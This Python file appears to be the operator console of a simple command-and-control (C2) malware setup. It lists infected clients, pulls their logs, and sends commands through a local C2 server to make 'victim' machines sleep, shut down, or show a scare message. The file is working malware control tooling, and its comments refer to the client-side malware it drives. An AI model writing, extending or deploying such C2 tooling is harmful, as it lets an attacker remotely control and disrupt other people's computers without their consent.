from typing import Optional
import requests
import re

PLAIN_HEADER = {'Content-Type': 'text/plain'}

# effectively run a simple repl, break once the user enters 'exit'
def run():
    print_home()
    while True:
        cmd = input('> ').strip()
        if len(cmd) == 0: 
            continue
        
        ret = handle_command(cmd)
        if ret: 
            break

def text_from_response(response) -> str:
    return f'RET CODE |{response.status_code}|\n\n{response.content.decode()}\n'

def handle_command(cmd) -> Optional[bool]:
    cmd = re.sub(pattern='\s+', repl=' ', string=cmd)
    arr = cmd.split(' ')

    # try handle help and exit first as they are simple
    # then handle the GET requests
    match arr[0]:
        case 'help': print_home(); return
        case 'exit': return True
        case 'clients':
            response = requests.get(f'http://127.0.0.1:5000/clients')
            print(text_from_response(response))
            return
        case 'logs':
            response = requests.get(f'http://127.0.0.1:5000/logs/{arr[1]}')
            print(text_from_response(response))
            return

    # check the command preconditions so we don't have to in the malware itself!
    match arr[0]:
        case 'slp':
            if len(arr) != 3: 
                print('Invalid slp syntax, needs two args <client_id> & <n>')
                return
            if not arr[2].isdigit(): 
                print('Invalid slp syntax, <n> must be a +ve int.')
                return
            cmd = f'{arr[0]} {arr[2]}' # disgard the client id in the actual client command!
        case 'shd': 
            if len(arr) != 2: 
                print('Invalid shd syntax, requires one arg <client_id>')
                return
            cmd = arr[0] # disgard the client id in the actual client command!
        case 'pwn': 
            if len(arr) != 2: 
                print('Invalid pwn syntax, requires one arg <client_id>')
                return
            cmd = arr[0] # disgard the client id in the actual client command!
        case _: 
            print(f'Invalid command: \'{arr[0]}\'\nPlease refer to the commands again.')
            return

    response = requests.post(f'http://127.0.0.1:5000/commands/{arr[1]}', data=cmd, headers=PLAIN_HEADER)
    print(text_from_response(response))


def print_home():
    print('''
     /-----------------------------------\\
    |-- Welcome To Your C2 Controller! ---|
     \\-----------------------------------/

    Commands to retrieve information:
      1) clients
          - Performs GET /clients to retrieve client id list.
      2) logs <client_id>
          - Performs GET /logs/<client_id> to retrieve logs for a specific client.

    List of remote commands:
      1) slp <client_id> <num_of_seconds>
          - Make the victim sleep for n seconds.
      2) shd <client_id>
          - Make the victim machine shutdown.
      3) pwn <client_id>
          - Display a simple messsage to the victim to scare them.

    Local commands:
      1) 'help' to display this page again!
      2) 'exit' to close current session.
    ''')


if __name__ == '__main__':
    run()